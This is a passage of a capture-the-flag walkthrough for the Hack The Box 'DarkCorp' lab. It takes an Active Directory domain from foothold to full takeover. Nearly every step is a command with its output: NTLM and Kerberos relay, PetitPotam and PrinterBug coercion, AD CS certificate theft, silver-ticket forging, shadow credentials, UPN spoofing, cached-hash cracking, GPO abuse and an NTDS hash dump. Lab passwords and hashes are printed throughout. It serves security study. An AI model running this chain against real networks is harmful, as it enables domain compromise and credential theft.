ntlmrelayx.py -t ldap://dc-01.darkcorp.htb --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' 10.10.14.61
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client WINRMS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

Ill start this up, still with socat running

Ill then send the request again through the web portal to connect back to drip server which will then relay it back to me

```python
[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://dc-01.darkcorp.htb
[*] (HTTP): Client requested path: /
[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://dc-01.darkcorp.htb SUCCEED [1]
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS record
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` record!
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` pointing to `10.10.14.61` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Dumping domain info for first time
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Domain info dumped into lootdir!
```

It looks to have worked

```python
bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u victor.r -p 'victor1gustavo@#' get dnsDump

recordName: dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.darkcorp.htb
A: 10.10.14.61
```

Then ill query DNS and i see that the record is there

## Certificate retrieval for `web-01$`

Now i can proceed with coercing auth from the `web-01` machine back to me then use krbrelay to relay it to the cert enrollment endpoint hopefully getting me a pfx as the `web-01` user

https://github.com/dirkjanm/krbrelayx

```python
python3 krbrelayx.py -t https://dc-01.darkcorp.htb/certsrv/certfnsh.asp --adcs -v 'web-01$'
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

Ill start up krbrelayx

```python
nxc smb web-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#' -M coerce_plus -o LISTENER=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PetitPotam
COERCE_PLUS 172.16.20.2     445    WEB-01           Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PrinterBug
COERCE_PLUS 172.16.20.2     445    WEB-01           Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, MSEven
```

Then ill use the nxc module for coersion

```python
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.232.7
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.232.7
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD: Received connection from 10.129.232.7
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.232.7
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.232.7
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.232.7
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] Skipping user web-01$ since attack was already performed
[*] GOT CERTIFICATE! ID 6
[*] Skipping user web-01$ since attack was already performed
[*] Writing PKCS#12 certificate to ./web-01.pfx
[*] Certificate successfully written to file
[*] Skipping user web-01$ since attack was already performed
```

I now have the certificate for the `web-01$` user

## Administrator on `web-01`

```python
certipy-ad auth -pfx web-01.pfx -dc-ip 172.16.20.1                                               
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'WEB-01.darkcorp.htb'
[*]     Security Extension SID: 'S-1-5-21-3432610366-2163336488-3604236847-20601'
[*] Using principal: 'web-01$@darkcorp.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'web-01.ccache'
[*] Wrote credential cache to 'web-01.ccache'
[*] Trying to retrieve NT hash for 'web-01$'
[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

Ill grab the NT hash, i can now use this to forge a silver ticket for the administrator

```python
ticketer.py -nthash '8f33c7fc7ff515c1f358e488fbb8b675' -domain-sid 'S-1-5-21-3432610366-2163336488-3604236847' -domain darkcorp.htb -spn 'cifs/web-01.darkcorp.htb' Administrator 
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkcorp.htb/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving/Updating ticket in Administrator.ccache
```

I now have a TGT for the administrator

```python
mv Administrator.ccache administrator-web-01.ccache
export KRB5CCNAME=administrator-web-01.ccache
```

Ill export he TGT

```python
nxc smb web-01.darkcorp.htb --use-kcache 
SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
```

The administrator is now compromised!

```python
nxc smb web-01.darkcorp.htb --use-kcache --sam
SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
SMB         web-01.darkcorp.htb 445    WEB-01           [*] Dumping SAM hashes
SMB         web-01.darkcorp.htb 445    WEB-01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::
SMB         web-01.darkcorp.htb 445    WEB-01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         web-01.darkcorp.htb 445    WEB-01           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         web-01.darkcorp.htb 445    WEB-01           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         web-01.darkcorp.htb 445    WEB-01           [+] Added 4 SAM hashes to the database
```

I can also dump the SAM

## Access as administrator on WINRM (`web-01`)

```python
evil-winrm -i web-01.darkcorp.htb -u administrator -H '88d84ec08dad123eb04a060a74053f21'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

I now have access as the administrator

## Extraciting DPAPI secrets

```python
nxc smb web-01.darkcorp.htb --use-kcache --dpapi 
SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
SMB         web-01.darkcorp.htb 445    WEB-01           [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         web-01.darkcorp.htb 445    WEB-01           [+] Got 6 decrypted masterkeys. Looting secrets...
SMB         web-01.darkcorp.htb 445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
```

The nxc module extracted a password, however having never used this functionality in nxc im going to check it manually as well

```python
*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500> dir -force


    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/15/2025   4:11 PM            468 189c6409-5515-4114-81d2-6dde4d6912ce
-a-hs-         1/16/2025  10:35 AM            468 6037d071-cac5-481e-9e08-c4296c0a7ff7
-a-hs-         9/10/2026   9:19 AM            468 f22d8b80-b64e-4aea-bc67-662aaca5aa41
-a-hs-         9/10/2026   9:19 AM             24 Preferred
```

I have found 3 keys

```python
*Evil-WinRM* PS C:\Users\Administrator\AppData\Local\Microsoft\Credentials> dir -force


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/16/2025  11:01 AM            560 32B2774DF751FF7E28E78AE75C237A1E
```

And also a credential

Ill download all of them

```python
dpapi.py masterkey -file 6037d071-cac5-481e-9e08-c4296c0a7ff7 -sid S-1-5-21-2988385993-1727309239-2541228647-500
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 6037d071-cac5-481e-9e08-c4296c0a7ff7
Flags       :        5 (5)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Password:
Decrypted key with User Key (SHA1)
Decrypted key: 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da
```

Using the password nxc found `But_Lying_Aid9!` i am able to decrpyt the key

```python
dpapi.py credential -file 32B2774DF751FF7E28E78AE75C237A1E -key '0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-16 19:01:39+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=WEB-01
Description : Updated by: Administrator on: 1/16/2025
Unknown     : 
Username    : Administrator
Unknown     : Pack_Beneath_Solid9!
```

I can then use this key to get another password!

The other two keys failed to decrpyt it!

## Compromising `john.w`

```python
nxc smb dc-01.darkcorp.htb -u users.txt -p 'Pack_Beneath_Solid9!' --continue-on-success
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Administrator:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Guest:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\krbtgt:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DC-01$:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\victor.r:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\svc_acc:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john.w:Pack_Beneath_Solid9! 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w.adm:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DRIP$:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b.adm:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE
```

Ill spray this password against some of the users, and i have compromised `john.w`

## Compromising `angela.w`

![Screenshot](images/darkcorp/pasted-image-20260910192004.webp)

My current user has GenericWrite on this user!

So its either a targeted kerberoast or shadow credentials

```python
certipy-ad shadow auto -u 'john.w@darkcorp.htb' -p 'Pack_Beneath_Solid9!' -account 'angela.w' -dc-host dc-01.darkcorp.htb -dc-ip 172.16.20.1 -ldap-scheme ldap
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'angela.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1e2b25402f2d44cf8f1911fdaf14a010'
[*] Adding Key Credential with device ID '1e2b25402f2d44cf8f1911fdaf14a010' to the Key Credentials for 'angela.w'
[*] Successfully added Key Credential with device ID '1e2b25402f2d44cf8f1911fdaf14a010' to the Key Credentials for 'angela.w'
[*] Authenticating as 'angela.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'angela.w@darkcorp.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'angela.w.ccache'
[*] Wrote credential cache to 'angela.w.ccache'
[*] Trying to retrieve NT hash for 'angela.w'
[*] Restoring the old Key Credentials for 'angela.w'
[*] Successfully restored the old Key Credentials for 'angela.w'
[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
```

Ill apply shadow credentials

```python
nxc smb dc-01.darkcorp.htb -u angela.w -H '957246c8137069bca672dc6aa0af7c7a'           
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\angela.w:957246c8137069bca672dc6aa0af7c7a
```

This user is now compromised

## UPN spoofing leads to compromised of `angela.w.adm`

Using `john.w` credentials i can see that this user does not have a UPN set, i can set one then request a TGT as the admin user

```python
bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u john.w -p 'Pack_Beneath_Solid9!' set object angela.w userPrincipalName -v 'angela.w.adm'
[+] angela.w's userPrincipalName has been updated
```

Ill set the UPN of the user

```python
getTGT.py -hashes ':957246c8137069bca672dc6aa0af7c7a' -principalType 'NT_ENTERPRISE' darkcorp.htb/angela.w.adm
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in angela.w.adm.ccache
```

Then ill request a TGT for this user

```python
scp angela.w.adm.ccache ebelford@drip.htb:/tmp
ebelford@drip.htb's password: 
angela.w.adm.ccache
```

Ill transfer this to the linux host

```python
ebelford@drip:/tmp$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
Authenticated angela.w.adm@DARKCORP.HTB
Account angela.w.adm: authorization for angela.w.adm@DARKCORP.HTB successful
Changing uid to angela.w.adm (1730401107)
angela.w.adm@drip:/tmp$
```

Then after using SSH to logon ill use the ticket to logon as the admin user account

## Root access on the drip server

```python
angela.w.adm@drip:/tmp$ sudo su
root@drip:/tmp# 
root@drip:/tmp# 
root@drip:/tmp# 
root@drip:/tmp# 
root@drip:/tmp# 
root@drip:/tmp#
```

This user has full sudo permissions

## Cached credentials

```python
root@drip:/etc/sssd# cat sssd.conf 

[sssd]
services = nss, pam
domains = darkcorp.htb

[domain/darkcorp.htb]
id_provider = ad
cache_credentials = True
auth_provider = ad
access_provider = simple
default_shell = /bin/bash
use_fully_qualified_names= False
krb5_store_password_if_offline = True
simple_allow_groups = linux_admins
```

There is cached credentials

```python
root@drip:/var/lib/sss/db# ls -la
total 5676
drwx------  2 root root    4096 Sep 10 12:42 .
drwxr-xr-x 10 root root    4096 Jan 10  2025 ..
-rw-------  1 root root 1609728 Sep 10 12:19 cache_darkcorp.htb.ldb
-rw-------  1 root root    2615 Sep 10 12:42 ccache_DARKCORP.HTB
-rw-------  1 root root 1286144 Sep 10 10:11 config.ldb
-rw-------  1 root root 1286144 Dec 30  2024 sssd.ldb
-rw-------  1 root root 1609728 Sep 10 12:46 timestamps_darkcorp.htb.ldb
root@drip:/var/lib/sss/db#
```

Ill have a look through some of these files

```python
root@drip:/var/lib/sss/db# cat cache_darkcorp.htb.ldb | grep -a 'cachedPassword'
1789068860initgrExpireTimestamp0memberofAname=Domain Users@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdbccacheFile"FILE:/tmp/krb5cc_1730401105_e6TfYScachedPasswordj$6$cyKiP3FHinOP63vG$1GF26r27xAXyH8enqLxsUrzf45dh5xK3U2hm9gIuYKCnqGB8VAxPHS55K8.XjbtdrVTSyPdG1wiV7o/CxibDH1cachedPasswordType1lastCachedPasswordChange
1789068860initgrExpireTimestamp0memberofAname=Domain Users@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdbccacheFile"FILE:/tmp/krb5cc_1730401105_e6TfYScachedPasswordj$6$cyKiP3FHinOP63vG$1GF26r27xAXyH8enqLxsUrzf45dh5xK3U2hm9gIuYKCnqGB8VAxPHS55K8.XjbtdrVTSyPdG1wiV7o/CxibDH1cachedPasswordType1lastCachedPasswordChange
1736373877initgrExpireTimestamp0ccacheFile"FILE:/tmp/krb5cc_1730414101_B5njULcachedPasswordj$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.cachedPasswordType1lastCachedPasswordChange
```

```python
hashcat '$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.' /usr/share/wordlists/rockyou.txt

$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.:!QAZzaq1
```

This hash cracked

## Compromising `talyor.b.adm`

```python
nxc smb dc-01.darkcorp.htb -u users.txt -p '!QAZzaq1' --continue-on-success            
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Administrator:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Guest:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\krbtgt:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DC-01$:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\victor.r:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\svc_acc:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\john.w:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w.adm:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DRIP$:!QAZzaq1 STATUS_LOGON_FAILURE 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1
```

I have compromised the user `taylor.b.adm`

![Screenshot](images/darkcorp/pasted-image-20260910200914.webp)

This is game over!

This user is part of remote management users
## Domain Admin

```python
python3 pygpoabuse.py 'darkcorp.htb'/'taylor.b.adm':'!QAZzaq1' -gpo-id '652CAE9A-4BB7-49F2-9E52-3361F33CE786' -f
[+] ScheduledTask TASK_f7202c64 created!
```

Ill set the schedules task, this will create a admin user on the machine called `john` with a password that can be found on the github page

```python
evil-winrm -i dc-01.darkcorp.htb -u taylor.b.adm -p '!QAZzaq1'       
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> gpupdate
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.



*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents>
```

Ill update the policy

```python
nxc smb dc-01.darkcorp.htb -u john -p 'H4x00r123..' --ntds
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john:H4x00r123.. (Pwn3d!)
SMB         172.16.20.1     445    DC-01            [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.20.1     445    DC-01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
SMB         172.16.20.1     445    DC-01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.20.1     445    DC-01            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
SMB         172.16.20.1     445    DC-01            victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
SMB         172.16.20.1     445    DC-01            svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
SMB         172.16.20.1     445    DC-01            john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
SMB         172.16.20.1     445    DC-01            angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
SMB         172.16.20.1     445    DC-01            angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
SMB         172.16.20.1     445    DC-01            taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
SMB         172.16.20.1     445    DC-01            taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
SMB         172.16.20.1     445    DC-01            darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
SMB         172.16.20.1     445    DC-01            darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
SMB         172.16.20.1     445    DC-01            john:33601:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
SMB         172.16.20.1     445    DC-01            DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
SMB         172.16.20.1     445    DC-01            DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:54368cbc18c6785851ec88c118d9fa78:::
SMB         172.16.20.1     445    DC-01            WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
SMB         172.16.20.1     445    DC-01            [+] Dumped 16 NTDS hashes to /home/kali/.nxc/logs/ntds/DC-01_172.16.20.1_2026-09-10_202006.ntds of which 13 were added to the database
SMB         172.16.20.1     445    DC-01            [*] To extract only enabled accounts from the output file, run the following command: 
SMB         172.16.20.1     445    DC-01            [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC-01_172.16.20.1_2026-09-10_202006.ntds | cut -d ':' -f1
```

Full domain compromise!

```python
evil-winrm -i dc-01.darkcorp.htb -u john -p 'H4x00r123..'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd ../../Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/10/2026   9:11 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

```python
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Domain Admin
